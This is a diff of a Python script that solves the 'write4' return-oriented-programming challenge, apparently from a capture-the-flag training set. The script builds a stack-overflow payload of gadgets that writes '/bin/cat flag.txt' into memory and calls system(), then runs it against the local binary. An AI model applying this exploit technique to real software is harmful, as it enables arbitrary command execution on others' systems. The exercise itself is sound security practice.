@@ -1,42 +1,48 @@
-#!/usr/bin/python
+#!/usr/bin/env python
 
 import sys
 import pwn
 import time
+import struct
 
 import util
 
-def main():
-    data_section = 0x00601040
-    rbp = data_section + 0x20
-    fgets = 0x004007ec
+load = 0x00400890
+store = 0x00400820
 
+def pack(a):
+    return struct.pack("<Q", a)
+
+def chain(a):
+    return ''.join(map(pack, a))
+
+def write_string(loc, st):
+    chain = ''
+    for i in xrange(0, len(st), 8):
+        data = st[i:i+8]
+        data += '\0' * (8-len(data))
+        chain += pack(load)
+        chain += pack(loc + i)
+        chain += data
+        chain += pack(store)
+    return chain
+
+def main():
+    data_section = 0x00601050
     pop_rdi = 0x00400893
     system = 0x00400810
 
-    addrs1 = [
-        rbp, # set up argument for fgets
-        fgets, # jump to fgets
-    ]
-    chain1 = util.chain(addrs1, 32)
-    inp = '/bin/cat flag.txt\0'
+    ch = 'a' * 40
+    ch += write_string(data_section, '/bin/cat flag.txt')
+    ch += chain([pop_rdi, data_section, system])
 
-    addrs2 = [
-        pop_rdi, # prepare argument for system
-        data_section, # value to put in rdi
-        system, # jump to system call
-    ]
-    chain2 = inp + '\0' * (0x28 - len(inp)) + util.chain(addrs2, 0)
+    with open('write4.in', 'wb') as f:
+        f.write("{}\n".format(ch))
 
-    with open("write4.in", "wb") as f:
-        f.write("{}\n{}\n".format(chain1, chain2))
-
-    print chain1
-    print chain2
-    #proc = pwn.process('./write4')
-    #proc.sendline(chain)
-    #proc.sendline(inp)
-    #print proc.recvall()
+    print ch
+    proc = pwn.process('./write4')
+    proc.sendline(ch)
+    print proc.recvall()
 
 if __name__ == '__main__':
     main()
